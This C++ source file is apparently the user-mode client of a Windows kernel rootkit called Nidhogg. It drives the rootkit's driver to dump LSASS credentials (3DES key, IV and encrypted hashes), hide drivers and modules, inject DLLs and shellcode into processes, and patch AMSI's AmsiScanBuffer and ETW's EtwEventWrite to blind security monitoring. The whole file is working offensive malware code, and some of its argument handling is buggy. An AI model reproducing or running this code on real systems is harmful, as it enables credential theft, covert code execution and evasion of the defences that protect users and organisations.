#include "pch.h"
#include "MemoryHandler.h"

/*
 * Description:
 * HandleCommand is responsible for handling a memory related command.
 *
 * Parameters:
 * @command [_In_ std::string] -- The command to be handled.
 *
 * Returns:
 * There is no return value.
 */
void MemoryHandler::HandleCommand(_In_ std::string command) {
	std::vector<std::string> params = SplitStringBySpace(command);
	std::string commandName = params.at(0);
	params.erase(params.begin());

	if (params.size() == 0) {
		PrintHelp();
		return;
	}

	if (commandName.compare("dump_creds") == 0) {
		if (params.size() != 0) {
			PrintHelp();
			return;
		}
		CredentialsInformation credentials{};

		try {
			credentials = DumpCredentials();
		}
		catch (const MemoryHandlerException& e) {
			std::cerr << "Error while dumping credentials: " << e.what() << std::endl;
			return;
		}

		if (credentials.Credentials.size() == 0) {
			std::cerr << "There are no credentials to display or an error occurred." << std::endl;
			return;
		}
		std::cout << "3DES Key (size: 0x" << std::hex << credentials.DesKey.size() << "): ";

		for (DWORD i = 0; i < credentials.DesKey.size(); i++)
			std::cout << static_cast<int>(credentials.DesKey[i]);
		std::cout << std::endl;
		std::cout << "IV (size: 0x" << std::hex << credentials.Iv.size() << "): ";

		for (DWORD i = 0; i < credentials.Iv.size(); i++)
			std::cout << static_cast<int>(credentials.Iv[i]);
		std::cout << std::endl;
		std::cout << "Credentials:" << std::endl;

		for (SIZE_T i = 0; i < credentials.Credentials.size(); i++) {
			std::wcout << L"\nUsername: " << credentials.Credentials[i].Username << std::endl;
			std::wcout << L"Domain: " << credentials.Credentials[i].Domain << std::endl;

			if (!credentials.Credentials[i].EncryptedHash.empty()) {
				std::cout << "Encrypted Hash: ";

				for (USHORT j = 0; j < credentials.Credentials[i].EncryptedHash.size(); j++)
					std::cout << static_cast<int>(credentials.Credentials[i].EncryptedHash[j]);
				std::cout << std::endl;
			}
		}
		std::cout << std::dec << std::endl;
	} else if (commandName.compare("hide_module") == 0) {
		std::wstring modulePath = L"";

		if (params.size() != 2) {
			PrintHelp();
			return;
		}

		if (!IsValidPid(params.at(0))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		modulePath = std::wstring(params.at(1).begin(), params.at(1).end());
		HideModule(pid, modulePath, true) ? std::wcout << L"Module " << modulePath << L" hidden successfully." << std::endl :
			std::wcerr << L"Failed to hide module " << modulePath << std::endl;
	}
	else if (commandName.compare("unhide_module") == 0 || commandName.compare("restore_module") == 0) {
		std::wstring modulePath = L"";

		if (params.size() != 2) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(0))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		modulePath = std::wstring(params.at(1).begin(), params.at(1).end());

		HideModule(pid, modulePath, false) ? std::wcout << L"Module " << modulePath << L" restored successfully." << std::endl :
			std::wcerr << L"Failed to restore module " << modulePath << std::endl;
	}
	else if (commandName.compare("hide_driver") == 0) {
		std::wstring driverPath = L"";

		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		try {
			driverPath = ParsePath<std::string, std::wstring>(params.at(0));
		}
		catch (const PathHelperException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		HideDriver(driverPath, true) ? std::wcout << L"Driver " << driverPath << L"hidden successfully." << std::endl :
			std::wcerr << L"Failed to hide driver " << driverPath << std::endl;
	} 
	else if (commandName.compare("unhide_driver") == 0 || commandName.compare("restore_driver") == 0) {
		std::wstring driverPath = L"";

		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		try {
			driverPath = ParsePath<std::string, std::wstring>(params.at(0));
		}
		catch (const PathHelperException& e) {
			std::cerr << e.what() << std::endl;
			return;
		}
		HideDriver(driverPath, false) ? std::wcout << "Driver " << driverPath << " revealed successfully." << std::endl :
			std::wcerr << "Failed to reveal driver " << driverPath << std::endl;
	}
	else if (commandName.compare("inject_dll") == 0) {
		InjectionType injectionType;

		if (params.size() != 3) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		std::string dllPath = params.at(2);

		if (params.at(0).compare("thread") == 0)
			injectionType = InjectionType::CreateThreadInjection;
		else if (params.at(0).compare("apc") == 0)
			injectionType = InjectionType::APCInjection;
		else {
			std::cerr << "Invalid injection type." << std::endl;
			PrintHelp();
			return;
		}

		if (!IsValidPath(dllPath)) {
			PrintHelp();
			return;
		}
		if (!InjectDll(pid, dllPath, injectionType)) {
			std::cerr << "Failed to inject DLL " << dllPath << " into process " << pid << "." << std::endl;
			return;
		}
		std::cout << "DLL " << dllPath << " injected successfully into process " << pid << "." << std::endl;
	} 
	else if (commandName.compare("inject_shellcode") == 0) {
		std::vector<std::string> parameters;
		InjectionType injectionType;

		if (params.size() < 3 || params.size() > 6) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(1))) {
			PrintHelp();
			return;
		}
		if (!IsValidPath(params.at(2))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));
		std::ifstream input(params.at(2), std::ios::binary);

		if (input.bad()) {
			std::cerr << "Invalid shellcode file." << std::endl;
			PrintHelp();
			return;
		}
		std::vector<byte> shellcode(std::istreambuf_iterator<char>(input), {});

		if (shellcode.empty()) {
			std::cerr << "Shellcode file is empty." << std::endl;
			PrintHelp();
			return;
		}
		
		if (params.at(0).compare("thread") == 0)
			injectionType = InjectionType::CreateThreadInjection;
		else if (params.at(0).compare("apc") == 0)
			injectionType = InjectionType::APCInjection;
		else {
			std::cerr << "Invalid injection type." << std::endl;
			PrintHelp();
			return;
		}

		if (params.size() > 3) {
			parameters.push_back(params.at(3));

			if (params.size() > 4) {
				parameters.push_back(params.at(4));

				if (params.size() > 5) {
					parameters.push_back(params.at(5));
				}
			}
		}

		if (!InjectShellcode(pid, shellcode, parameters, injectionType)) {
			std::cerr << "Failed to inject shellcode into process " << pid << "." << std::endl;
			return;
		}
		std::cout << "Shellcode injected successfully into process " << pid << "." << std::endl;
	}
	else if (commandName.compare("patch") == 0) {
		if (params.size() != 4) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(0))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));
		std::wstring moduleName = std::wstring(params.at(1).begin(), params.at(1).end());
		std::string functionName = params.at(2);
		std::vector<byte> patch = ConvertToVector(params.at(3));

		if (!PatchModule(pid, moduleName, functionName, patch)) {
			std::wcerr << L"Failed to patch module " << moduleName << L"." << std::endl;
			return;
		}
		std::wcout << L"Module " << moduleName << L" patched successfully." << std::endl;
	} 
	else if (commandName.compare("patch_amsi") == 0) {
		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(0))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(0).c_str()));

		if (!PatchAmsi(pid)) {
			std::cerr << "Failed to patch AMSI in process " << pid << "." << std::endl;
			return;
		}
		std::cout << "AMSI patched successfully in process " << pid << "." << std::endl;
	} 
	else if (commandName.compare("patch_etw") == 0) {
		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		if (!IsValidPid(params.at(0))) {
			PrintHelp();
			return;
		}
		DWORD pid = static_cast<DWORD>(atoi(params.at(1).c_str()));

		if (!PatchEtw(pid)) {
			std::cerr << "Failed to patch ETW in process " << pid << "." << std::endl;
		}
		std::cout << "ETW patched successfully in process " << pid << "." << std::endl;
	}
	else if (commandName.compare("execute_script") == 0) {
		if (params.size() != 1) {
			PrintHelp();
			return;
		}
		std::ifstream scriptFile(params.at(0), std::ios::binary);

		if (!scriptFile.is_open()) {
			std::cerr << "Failed to open script file: " << params.at(1) << std::endl;
			return;
		}
		std::vector<byte> script(std::istreambuf_iterator<char>(scriptFile), {});

		if (script.empty()) {
			std::cerr << "Script file is empty." << std::endl;
			return;
		}
		if (!ExecuteScript(script)) {
			std::cerr << "Failed to execute script." << std::endl;
		}
		std::cout << "Script executed successfully." << std::endl;
	} 
	else {
		std::cerr << "Invalid command!" << std::endl;
		PrintHelp();
	}
}

/*
 * Description:
 * DumpCredentials is responsible for dumping credentials from LSASS.
 *
 * Parameters:
 * There are no parameters.
 *
 * Returns:
 * @std::vector<Credentials> -- A vector containing the dumped credentials.
 */
CredentialsInformation MemoryHandler::DumpCredentials() {
	IoctlCredentialsInformation credentials{};
	CredentialsInformation info{};
	Credential cred{};
	DWORD returned = 0;
	SIZE_T credSize = 0;
	DWORD index = 0;
	bool error = false;

	// Generating cached credentials.
	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
		nullptr, 0, &credSize, sizeof(credSize), &returned, nullptr)) {
		throw MemoryHandlerException("Failed to get credentials size from driver.");
	}

	if (credSize == 0)
		throw MemoryHandlerException("No credentials found or an error occurred while getting credentials size.");

	// Get 3DES key.
	try {
		credentials.DesKey.Data = SafeAlloc<PVOID>(credentials.DesKey.Size);
	}
	catch (const SafeMemoryException& e) {
		throw MemoryHandlerException(e.what());
	}

	try {
		credentials.Iv.Data = SafeAlloc<PVOID>(credentials.Iv.Size);
	}
	catch (const SafeMemoryException& e) {
		SafeFree(credentials.DesKey.Data);
		throw MemoryHandlerException(e.what());
	}

	try {
		credentials.Creds = SafeAlloc<IoctlCredentials*>(credSize * sizeof(IoctlCredentials));
	}
	catch (const SafeMemoryException& e) {
		SafeFree(credentials.DesKey.Data);
		SafeFree(credentials.Iv.Data);
		throw MemoryHandlerException(e.what());
	}

	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_DUMP_CREDENTIALS,
		&credentials, sizeof(IoctlCredentialsInformation), &credentials, sizeof(IoctlCredentialsInformation), 
		&returned, nullptr)) {
		SafeFree(credentials.Creds);
		SafeFree(credentials.Iv.Data);
		SafeFree(credentials.DesKey.Data);
		throw MemoryHandlerException("Failed to get DES key data from driver.");
	}

	for (DWORD i = 0; i < credentials.DesKey.Size; i++) {
		info.DesKey.push_back(static_cast<UCHAR*>(credentials.DesKey.Data)[i]);
	}

	for (DWORD i = 0; i < credentials.Iv.Size; i++) {
		info.Iv.push_back(static_cast<UCHAR*>(credentials.Iv.Data)[i]);
	}

	for (SIZE_T i = 0; i < credentials.Count; i++) {
		cred.Username = std::wstring(credentials.Creds[i].Username.Buffer, credentials.Creds[i].Username.Length / sizeof(WCHAR));
		cred.EncryptedHash = std::wstring(credentials.Creds[i].EncryptedHash.Buffer, credentials.Creds[i].EncryptedHash.Length / sizeof(WCHAR));
		cred.Domain = std::wstring(credentials.Creds[i].Domain.Buffer, credentials.Creds[i].Domain.Length / sizeof(WCHAR));
		info.Credentials.push_back(cred);
		SafeFree(credentials.Creds[i].Username.Buffer);
		SafeFree(credentials.Creds[i].Domain.Buffer);
		SafeFree(credentials.Creds[i].EncryptedHash.Buffer);
	}
	SafeFree(credentials.Creds);
	SafeFree(credentials.Iv.Data);
	SafeFree(credentials.DesKey.Data);
	return info;
}

/*
 * Description:
 * HideDriver is responsible for hiding a driver.
 * 
 * Parameters:
 * @driverPath [_In_ std::wstring] -- The path of the driver to be hidden.
 * @hide	   [_In_ bool]		   -- Whether to hide or unhide the driver.
 * 
 * Returns:
 * @bool						   -- Whether the operation was successful or not.
 */
bool MemoryHandler::HideDriver(_In_ std::wstring driverPath, _In_ bool hide) {
	DWORD returned = 0;
	IoctlHiddenDriverInfo driverInfo{};

	if (!IsValidPath(driverPath))
		return false;
	driverInfo.DriverName = driverPath.data();
	driverInfo.Hide = hide;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_UNHIDE_DRIVER, &driverInfo, sizeof(driverInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * HideModule is responsible for hiding and restoring a module inside a process.
 *
 * Parameters:
 * @pid [_In_ DWORD]			   -- The PID of the process.
 * @modulePath [_In_ std::wstring] -- The path of the module to be hidden.
 * @hide [_In_ bool]			   -- Whether to hide or restore the module.
 *
 * Returns:
 * @bool						   -- Whether the operation was successful or not.
 */
bool MemoryHandler::HideModule(_In_ DWORD pid, _In_ std::wstring modulePath, _In_ bool hide) {
	IoctlHiddenModuleInfo moduleInfo{};
	DWORD returned = 0;

	if (pid <= SYSTEM_PID || !IsValidPath(modulePath)) {
		std::cerr << "Invalid PID or module path." << std::endl;
		return false;
	}
	moduleInfo.Pid = pid;
	moduleInfo.ModuleName = modulePath.data();
	moduleInfo.Hide = hide;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_HIDE_RESTORE_MODULE, &moduleInfo, sizeof(moduleInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * InjectDll is responsible for injecting a DLL into a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @dllPath [_In_ std::string] -- The path of the DLL to be injected.
 * @injectionType [_In_ InjectionType] -- The type of injection to be used.
 *
 * Returns:
 * @bool -- Whether the injection was successful or not.
 */
bool MemoryHandler::InjectDll(_In_ DWORD pid, _In_ std::string dllPath, _In_ InjectionType injectionType) {
	IoctlDllInfo dllInformation{};

	if (pid <= SYSTEM_PID || !IsValidPath(dllPath)) {
		std::cerr << "Invalid PID or DLL path." << std::endl;
		return false;
	}
	dllInformation.Type = injectionType;
	dllInformation.Pid = pid;
	errno_t err = strcpy_s(dllInformation.DllPath, dllPath.c_str());

	if (err != 0) {
		std::cerr << "Failed to copy DLL path." << std::endl;
		return false;
	}
	DWORD returned = 0;
	return DeviceIoControl(*hNidhogg.get(), IOCTL_INJECT_DLL, &dllInformation, sizeof(dllInformation), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * InjectShellcode is responsible for injecting shellcode into a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @shellcode [_In_ std::vector<byte>] -- The shellcode to be injected.
 * @parameters [_In_ std::vector<std::string>] -- The parameters for the shellcode.
 * @injectionType [_In_ InjectionType] -- The type of injection to be used.
 *
 * Returns:
 * @bool -- Whether the injection was successful or not.
 */
bool MemoryHandler::InjectShellcode(_In_ DWORD pid, _In_ std::vector<byte> shellcode, std::vector<std::string> parameters, _In_ InjectionType injectionType) {
	IoctlShellcodeInfo shellcodeInfo{};
	DWORD returned = 0;

	if (pid <= SYSTEM_PID || shellcode.empty()) {
		std::cerr << "Invalid PID or shellcode." << std::endl;
		return false;
	}
	if (parameters.size() > MAX_SHELLCODE_PARAMETERS) {
		std::cerr << "Too many parameters for shellcode injection." << std::endl;
		return false;
	}
	shellcodeInfo.Pid = pid;
	shellcodeInfo.Type = injectionType;
	shellcodeInfo.ShellcodeSize = shellcode.size();
	shellcodeInfo.Shellcode = shellcode.data();

	if (parameters.size() > 0) {
		shellcodeInfo.Parameter1 = const_cast<char*>(parameters[0].data());
		shellcodeInfo.Parameter1Size = parameters[0].size();

		if (parameters.size() > 1) {
			shellcodeInfo.Parameter2 = const_cast<char*>(parameters[1].data());
			shellcodeInfo.Parameter2Size = parameters[1].size();

			if (parameters.size() > 2) {
				shellcodeInfo.Parameter3 = const_cast<char*>(parameters[2].data());
				shellcodeInfo.Parameter3Size = parameters[2].size();
			}
		}
	}
	return DeviceIoControl(*hNidhogg.get(), IOCTL_INJECT_SHELLCODE, &shellcodeInfo, sizeof(shellcodeInfo), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * PatchModule is responsible for patching a module inside a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 * @moduleName [_In_ std::wstring] -- The name of the module to be patched.
 * @functionName [_In_ std::string] -- The name of the function to be patched.
 * @patch [_In_ std::vector<byte>] -- The patch data.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchModule(_In_ DWORD pid, _In_ std::wstring moduleName, _In_ std::string functionName, _In_ std::vector<byte> patch) {
	DWORD returned;
	IoctlPatchedModule patchedModule{};

	if (pid <= SYSTEM_PID || !IsValidPath(moduleName) || functionName.size() == 0 || patch.size() == 0)
		return false;

	patchedModule.Pid = pid;
	patchedModule.PatchLength = static_cast<ULONG>(patch.size());
	patchedModule.ModuleName = moduleName.data();
	patchedModule.FunctionName = functionName.data();
	patchedModule.Patch = patch.data();
	return DeviceIoControl(*hNidhogg.get(), IOCTL_PATCH_MODULE, &patchedModule, sizeof(patchedModule), nullptr, 0, &returned, nullptr);
}

/*
 * Description:
 * PatchAmsi is responsible for patching AMSI in a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchAmsi(_In_ DWORD pid) {
	return PatchModule(pid, AMSI_PATH, "AmsiScanBuffer", AMSI_BYPASS_PAYLOAD);
}

/*
 * Description:
 * PatchEtw is responsible for patching ETW in a process.
 *
 * Parameters:
 * @pid [_In_ DWORD] -- The PID of the target process.
 *
 * Returns:
 * @bool -- Whether the patching was successful or not.
 */
bool MemoryHandler::PatchEtw(_In_ DWORD pid) {
	return PatchModule(pid, NTDLL_PATH, "EtwEventWrite", ETW_BYPASS_PAYLOAD);
}

/*
 * Description:
 * ExecuteScript is responsible for executing a script in the kernel.
 *
 * Parameters:
 * @script [_In_ std::vector<byte>] -- The script to be executed.
 * @scriptSize [_In_ SIZE_T] -- The size of the script.
 *
 * Returns:
 * @bool -- Whether the execution was successful or not.
 */
bool MemoryHandler::ExecuteScript(_In_ std::vector<byte> script) {
	/*DWORD bytesReturned = 0;
	ScriptInformation scriptInfo{};

	if (script.size() == 0)
		return false;

	scriptInfo.Script = script.data();
	scriptInfo.ScriptSize = script.size();
	return DeviceIoControl(*hNidhogg.get(), IOCTL_EXEC_SCRIPT, &scriptInfo, sizeof(scriptInfo), nullptr, 0, &bytesReturned, nullptr);*/
	// GOING TO BE DEPRECATED
	return false;
}